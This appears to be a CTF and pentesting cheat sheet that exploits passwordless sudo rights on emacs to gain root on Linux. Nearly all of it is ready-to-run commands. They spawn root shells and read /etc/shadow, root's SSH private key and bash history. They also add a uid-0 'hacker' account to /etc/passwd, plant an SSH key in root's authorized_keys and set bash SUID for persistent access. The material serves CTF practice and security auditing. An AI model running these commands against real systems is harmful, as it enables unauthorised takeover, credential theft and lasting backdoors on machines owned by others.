## When Does This Apply?

When `sudo -l` output shows:

```
(ALL) NOPASSWD: /bin/emacs
(ALL) NOPASSWD: /usr/bin/emacs
```

This means you can run emacs as **root without a password** — a direct privilege escalation path.

---

## Method 1 — Spawn Root Shell (Non-Interactive)

```bash
# Run shell command directly without opening editor
sudo emacs -nw --eval '(shell-command "/bin/bash")'

# Or using term for interactive shell
sudo emacs -nw --eval '(term "/bin/bash")'
```

---

## Method 2 — Read Sensitive Files Directly

```bash
# Read /etc/shadow
sudo emacs -nw --eval '(shell-command "cat /etc/shadow")'

# Find and read flag
sudo emacs -nw --eval '(shell-command "find / -name flag.txt 2>/dev/null")'
sudo emacs -nw --eval '(shell-command "cat /root/flag.txt")'

# Read root's bash history
sudo emacs -nw --eval '(shell-command "cat /root/.bash_history")'

# Read SSH private key
sudo emacs -nw --eval '(shell-command "cat /root/.ssh/id_rsa")'
```

---

## Method 3 — Inside Emacs Interactive Mode

```bash
# Open emacs as root
sudo emacs
```

Once inside emacs:

|Shortcut|Action|
|---|---|
|`M-x shell`|Open shell (Alt+x → type "shell")|
|`M-!`|Run single shell command (Alt+!)|
|`M-x term`|Open full terminal emulator|
|`C-x C-f /etc/shadow`|Open any file directly|
|`C-x C-f /root/flag.txt`|Open root's flag file|

---

## Method 4 — Write Files as Root

```bash
# Add a new root user to /etc/passwd
sudo emacs -nw --eval '(shell-command "echo '\''hacker:x:0:0:root:/root:/bin/bash'\'' >> /etc/passwd")'

# Add SSH key to root's authorized_keys
sudo emacs -nw --eval '(shell-command "echo YOUR_PUBLIC_KEY >> /root/.ssh/authorized_keys")'

# Make /bin/bash SUID for persistent access
sudo emacs -nw --eval '(shell-command "chmod u+s /bin/bash")'
# Then use: /bin/bash -p
```

---

## Method 5 — Emacs as SUID Binary

If emacs itself has the SUID bit set (not sudo):

```bash
# Find SUID emacs
find / -perm -4000 -name "emacs*" 2>/dev/null

# Exploit directly (no sudo needed)
emacs -nw --eval '(term "/bin/bash")'
```

---

## CTF Quick Workflow

```bash
# Step 1 — confirm sudo rights
sudo -l

# Step 2 — spawn root shell
sudo emacs -nw --eval '(term "/bin/bash")'

# Step 3 — verify root
whoami

# Step 4 — find flag
find / -name "flag*" 2>/dev/null
find / -name "*.txt" -path "*/root/*" 2>/dev/null

# Step 5 — read flag
cat /root/flag.txt
```

---

## Why Emacs Can Escalate Privileges

Emacs is a full **text editor + Lisp interpreter + shell environment**. It can:

- Execute arbitrary shell commands via `shell-command`
- Open a full terminal via `term`
- Read and write any file on the system
- Run Emacs Lisp scripts with full OS access

When run as root (via sudo), all these capabilities execute with **root privileges**.

---

## Reference

- GTFOBins — Emacs: https://gtfobins.github.io/gtfobins/emacs/
- Other common sudo escalation binaries: `vim`, `nano`, `less`, `python`, `perl`, `find`, `awk`

---

> 💡 **Key Takeaway:** Any text editor or interpreter granted unrestricted sudo access is a privilege escalation vector. Always check `sudo -l` first when doing CTF or pentesting.